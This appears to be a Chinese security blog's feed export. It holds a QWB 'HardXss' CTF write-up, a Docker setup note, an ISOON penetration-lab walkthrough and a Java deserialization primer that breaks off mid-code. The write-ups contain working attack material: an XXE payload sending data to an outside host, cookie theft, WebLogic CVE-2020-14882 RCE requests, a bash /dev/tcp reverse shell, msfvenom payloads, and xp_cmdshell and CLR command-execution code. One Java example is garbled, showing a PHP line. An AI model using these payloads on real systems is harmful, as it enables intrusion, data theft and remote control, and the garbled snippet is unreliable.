        <content type="html"><![CDATA[<h1 id="QWB-HardXss复现"><a href="#QWB-HardXss复现" class="headerlink" title="[QWB]HardXss复现"></a>[QWB]HardXss复现</h1><h2 id="登陆-sql注入"><a href="#登陆-sql注入" class="headerlink" title="登陆(sql注入)"></a>登陆(sql注入)</h2><p>拿到页面后只有一个登陆框和一个提交反馈的页面，提交反馈界面需要登陆</p><p>登陆框的话，肯定先测试注入</p><p>发现过滤了空格，空格绕过常规操作<code>admin&#39;or(1)#</code></p><p>登陆成功，但是发现response包含Set-Cookie，并且设置了domain</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622220457053.png" alt="image-20210622220457053"></p><p>只能手动设置cookie并登陆</p><p>登陆进去是一个/admin/界面，并且只有一个头像上传功能，并且带预览，发现允许上传的类型中包含svg</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622221455914.png" alt="image-20210622221455914"></p><p>在源码里还发现一个display:none标签</p><p><code>&lt;a href=&quot;https://flaaaaaaaag.cubestone.com?secret=demo&quot; style=&quot;display:none&quot;&gt;内网管理中心&lt;/a&gt;</code></p><p>而在我们刚刚登陆之前的界面里还有一个提交反馈功能点</p><p>里面有链接参数框，经检测，会有robot去访问我们的链接</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622222954950.png" alt="image-20210622222954950"></p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622223026416.png" alt="image-20210622223026416"></p><p>看了大佬的文章，发现很多非预期都是利用低版本的chrome_1day，这里的chrome版本在–no-sanbox下的确可以成功，但是这种思路并不是作者的预期解</p><p>根据上面这几点我们可以很容易的联想到利用xss来ssrf，我们先尝试获取管理员cookie</p><p>利用<a href="https://xss.pt/">xss.pt</a>平台接收cookie</p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622222351597.png" alt="image-20210622222351597"></p><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210622223520619.png" alt="image-20210622223520619"></p><p>但是下面一个问题，该如何让robot去访问<code>https://flaaaaaaaag.cubestone.com/?secret=demo</code></p><p>因为存在跨域问题，这样我们的js就无法实现去访问</p><p>看了大佬的文章，知道这里可以利用xxe来实现</p><p>构造xxe的dtd放到vps上,svg配合xxe的payload的在<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-inside-svg">PayloadsAllTheThings</a>上面有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=https://flaaaaaaaag.cubestone.com/?secret=demo&quot;&gt;</span><br><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY send SYSTEM &#x27;https://xxe.f4l1k.repl.co/?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>再将svg的xml上传</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://xxe.f4l1k.repl.co/exp.xml&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;%payload;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;send;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/[QWB]HardXss/image-20210623122407638.png" alt="image-20210623122407638"></p><p>我们成功拿到源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script &gt;</span><br><span class="line"><span class="built_in">document</span>.domain=<span class="string">&quot;cubestone.com&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pageload</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.body.innerText=data;</span><br><span class="line">&#125;</span><br><span class="line">fetch(<span class="string">`loader.php?callback=pageload&amp;secret=demo`</span>).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;<span class="keyword">return</span> res.text();&#125;).then(<span class="function">(<span class="params">data</span>)=&gt;</span>&#123;<span class="built_in">eval</span>(data);&#125;)&lt;/script</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们尝试去访问一下<code>loader.php?callback=pageload&amp;secret=demo</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pageload(&#x27;Control center access require a vaild secret key. You entered a invaild secret!&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker和phpstorm搭建php开发环境</title>
      <link href="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/"/>
      <url>/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>首先docker-compose启动php5.6、php7.4、mysql5.6三个容器，并建立连接</p><p><img src="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20210319185351082.png" alt="image-20210319185351082"></p><p><img src="/2021/10/31/general/docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/image-20210319185303646.png" alt="image-20210319185303646"></p><p>以上步骤完全可以通过docker-compose与Dockerfile实现，出于懒</p><p>咕咕咕🕊</p><p>咕咕咕结束</p><p><a href="https://github.com/falipan/phpstorm-docker-php-mysql">送上github项目</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISOON</title>
      <link href="/2021/10/31/general/isoon/"/>
      <url>/2021/10/31/general/isoon/</url>
      
        <content type="html"><![CDATA[<p>nmap扫描端口</p><p><img src="/2021/10/31/general/isoon/image-20201210100956266.png" alt="image-20201210100956266"></p><p>8080端口有web服务，发现是个ssrf</p><p>可以读/etc/hosts</p><p><img src="/2021/10/31/general/isoon/image-20201210101221923.png" alt="image-20201210101221923"></p><p>给了内网网段，扫一波内网主机</p><p><img src="/2021/10/31/general/isoon/image-20201210101547223.png" alt="image-20201210101547223"></p><p>内网119有主机存活，继续扫描端口</p><p><img src="/2021/10/31/general/isoon/image-20201210104627492.png" alt="image-20201210104627492"></p><p><a href="http://192.168.57.119:7001有一个web服务，使用的是weblogic框架">http://192.168.57.119:7001有一个web服务，使用的是weblogic框架</a></p><p>WebLogic Server Version: 12.2.1.3.0</p><p>使用（CVE2020­14882/14883）可以rce</p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>我们可以利用msf生成一个elf马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.10.191 lport=5555 -f elf &gt; test.elf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#x27;wget http://192.168.10.192/test.elf&#x27;);&quot;)</span><br></pre></td></tr></table></figure><p>需要权限+X</p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#x27;)&amp;cmd=whoami</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/isoon/image-20201210103713000.png" alt="image-20201210103713000"></p><p>将payload编码一下，利用ssrf弹bash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.57.119:7001/console/css/%2e%2e%2fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession(&#x27;weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, cmd&#125;;if(cmd != null )&#123; String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();&#125; currentThread.interrupt();&#x27;)&amp;cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%30%2e%31%39%31%2f%34%34%34%34%20%30%3e%26%31%27</span><br></pre></td></tr></table></figure><p>cmd是经过url编码的bash</p><p><img src="/2021/10/31/general/isoon/image-20201210103954589.png" alt="image-20201210103954589"></p><p>拿到shell后我们要信息收集，在/home/weblogic/Oracle/Middleware/user_projects/domains/iSoonDomain/config/jdbc</p><p>有个配置文件发现连了数据库</p><p><img src="/2021/10/31/general/isoon/image-20201210105604364.png" alt="image-20201210105604364"></p><p>将/home/weblogic/Oracle/Middleware/user_projects/domains/iSoonDomain/security、SerializedSystemIni.dat</p><p>利用<a href="https://github.com/Ch1ngg/WebLogicPasswordDecryptorUi">weblogic解密工具</a>可以解出密码</p><p><img src="/2021/10/31/general/isoon/image-20201210105959231.png" alt="image-20201210105959231"></p><p>我们需要用这台机器当跳板机来连mssql，所以我们需要个代理</p><p>可以使用<code>ew</code>或<code>msf</code></p><blockquote><p><strong>EW</strong></p><p><a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>公网</p><blockquote><p>./ew_for_linux64 -s rcsocks -l 转发端口 -e 接收端口</p></blockquote><p>内网</p><p>./ew_for_linux64 -s rssocks -d 目的ip -e 发送端口</p></blockquote><blockquote><p><strong>msf</strong></p><p>run get_local_subnets # 获取内网网段</p><p>run autoroute -s 10.223.71.0/24 # route add 目的ip 255.255.255.0 [session id] 两种方法都可以，第二种方式需在session外</p><p>use auxiliary/server/socks5</p><blockquote><p>SRVHOST   0.0.0.0          yes       The address to listen on<br>SRVPORT   1080             yes       The port to listen on</p></blockquote></blockquote><p>使用navicat连sqlserver</p><p>可以开启xp_cmdshell存储进程来执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--打开xp_cmdshell</span><br><span class="line"> EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 1;RECONFIGURE;</span><br><span class="line">--关闭xp_cmdshell</span><br><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure><p>执行</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec xp_cmdshell &#x27;whoami&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2021/10/31/general/isoon/image-20201210110908057.png" alt="image-20201210110908057"></p><p>预期解说是利用clr</p><p>将下面代码保存为cmd_exec.cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">using System.Data;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using System.Data.SqlTypes;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Text;</span><br><span class="line"></span><br><span class="line">public partial class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">    [Microsoft.SqlServer.Server.SqlProcedure]</span><br><span class="line">    public static void cmd_exec (SqlString execCommand)</span><br><span class="line">    &#123;</span><br><span class="line">        Process proc = new Process();</span><br><span class="line">        proc.StartInfo.FileName = @&quot;C:\Windows\System32\cmd.exe&quot;;</span><br><span class="line">        proc.StartInfo.Arguments = string.Format(@&quot; /C &#123;0&#125;&quot;, execCommand.Value);</span><br><span class="line">        proc.StartInfo.UseShellExecute = false;</span><br><span class="line">        proc.StartInfo.RedirectStandardOutput = true;</span><br><span class="line">        proc.Start();</span><br><span class="line"></span><br><span class="line">        // Create the record and specify the metadata for the columns.</span><br><span class="line">        SqlDataRecord record = new SqlDataRecord(new SqlMetaData(&quot;output&quot;, SqlDbType.NVarChar, 4000));</span><br><span class="line"></span><br><span class="line">        // Mark the beginning of the result set.</span><br><span class="line">        SqlContext.Pipe.SendResultsStart(record);</span><br><span class="line"></span><br><span class="line">        // Set values for each column in the row</span><br><span class="line">        record.SetString(0, proc.StandardOutput.ReadToEnd().ToString());</span><br><span class="line"></span><br><span class="line">        // Send the row back to the client.</span><br><span class="line">        SqlContext.Pipe.SendResultsRow(record);</span><br><span class="line"></span><br><span class="line">        // Mark the end of the result set.</span><br><span class="line">        SqlContext.Pipe.SendResultsEnd();</span><br><span class="line"></span><br><span class="line">        proc.WaitForExit();</span><br><span class="line">        proc.Close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>windows  .net自带csc.exe，下面命令可以找到csc.exe路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ChildItem -Recurse &quot;C:\Windows\Microsoft.NET\&quot; -Filter &quot;csc.exe&quot; | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname</span><br></pre></td></tr></table></figure><p>然后编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library C:/Users/kai/Desktop/cmd_exec.cs</span><br></pre></td></tr></table></figure><p>我们需要将dll文件转成hex才能使用,使用下方powershell脚本可以转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$assemblyFile = &quot;C:\Users\kai\Desktop\cmd_exec.dll&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder = New-Object -Type System.Text.StringBuilder </span><br><span class="line">$stringBuilder.Append(&quot;CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM `n0x&quot;) | Out-Null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$fileStream = [IO.File]::OpenRead($assemblyFile)</span><br><span class="line">while (($byte = $fileStream.ReadByte()) -gt -1) &#123;</span><br><span class="line">    $stringBuilder.Append($byte.ToString(&quot;X2&quot;)) | Out-Null</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;\nWITH PERMISSION_SET = UNSAFE&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$stringBuilder.AppendLine(&quot;EXEC[dbo].[cmd_exec] &#x27;whoami&#x27;&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot;GO&quot;) | Out-Null</span><br><span class="line">$stringBuilder.AppendLine(&quot; &quot;) | Out-Null</span><br><span class="line"></span><br><span class="line">$stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\kai\Desktop\cmd_exec.txt</span><br></pre></td></tr></table></figure><p>以sysadmin登录mssql执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Sp_Configure &#x27;clr enabled&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">ALTER DATABASE master SET TRUSTWORTHY ON;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">CREATE ASSEMBLY [my_assembly] AUTHORIZATION [dbo] FROM </span><br><span class="line">0x4D5A90000300000004000000F[TRUNCATED]</span><br><span class="line">WITH PERMISSION_SET = UNSAFE </span><br><span class="line">GO </span><br><span class="line"></span><br><span class="line">CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [my_assembly].[StoredProcedures].[cmd_exec];</span><br><span class="line">GO</span><br><span class="line"> </span><br><span class="line">EXEC[dbo].[cmd_exec] &#x27;whoami&#x27;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure><p>使用<code>cmd_exec &#39;whoami&#39;</code>就可以执行命令</p><p>但是此机器无外网 ，无法反弹webshell</p><p>不过msf如果监听的是跳板机，那他会在跳板机开一个端口监听，直接反向链接（ps:u1s1王神真强</p><p>使用msf自带payload</p><p><img src="/2021/10/31/general/isoon/image-20201210202255351.png" alt="image-20201210202255351"></p><p>成功弹到shell</p><p>whoami  /priv 发现有<code>SeImpersonatePrivilege</code>权限</p><p>可以使用potato提权</p>]]></content>
      
      
      
        <tags>
            
            <tag> study </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初探java反序列化</title>
      <link href="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>java序列化是指将对象转换为字节流的过程（ObjectOutStream中的writeObject()方法）</p><p>java反序列化就是将字节序列恢复为java对象的过程（ObjectInputStream重的readObject()方法）</p><p>序列化对象类必须实现java.io.Serializable接口，并且所有属性的都是可序列话的</p><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String user;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUser</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.user=name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUser</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>User类继承了Serializable接口</p><p>序列化和反序列化函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setUser(<span class="string">&quot;f4l1K&quot;</span>);</span><br><span class="line">        FileOutputStream file = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;f4liK.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(file);</span><br><span class="line">        out.writeObject(user);</span><br><span class="line">        out.close();</span><br><span class="line">        User user1 = (User) unSerializ();</span><br><span class="line">        System.out.println(user1.getUser());</span><br><span class="line">&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unSerializ</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        FileInputStream file =  <span class="keyword">new</span> FileInputStream(<span class="string">&quot;f4liK.bin&quot;</span>);</span><br><span class="line">        ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(file);</span><br><span class="line">        <span class="keyword">return</span> input.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f4liK中就是我们序列化的</p><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319162908083.png" alt="image-20210319162908083"></p><ul><li><code>0xaced</code> 魔术头</li><li><code>0x0005</code> 序列化格式版本号</li><li><code>0x73</code> 代表接下代读取的是一个对象</li><li><code>0x72</code> 代表该对象是一个对类的描述</li><li><code>0x0009</code> 指该类描述信息长度，刚好为Demo.User长度</li><li><code>0x70eea382105b0d9b4</code> serialVserionUID(序列版本唯一标识，简称SUID)</li><li><code>0x02</code>     对象序列化属性标志位</li><li><code>0x0001</code> 类的字段个数</li><li><code>0x4c</code> L,即代表对象</li><li><code>0x0004</code> 依旧代表长度，与User对应</li></ul><p>利用ObjectInputStream中read.Object即可读出序列化内容</p><p><img src="/2021/10/31/general/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20210319163419406-5674818.png" alt="image-20210319163419406"></p><h3 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h3><p>当我们序列话对象的类重写了readObject()方法，我们再次反序列化时会调用重写的readObject()方法，我们用个例子说明</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">highlight_file(__FILE__);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们重写的readObject中会调用计算器，我们序列化该类对象并反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Testse test=<span class="keyword">new</span> Testse();</span><br><span class="line">        FileOutputStream file = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;f4l1K.bin&quot;</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(file);</span><br><span class="line">        out.writeObject(test);</span><br><span class="line">        out.close();</span><br><span class="line">        unSerializ();</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unSerializ</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span 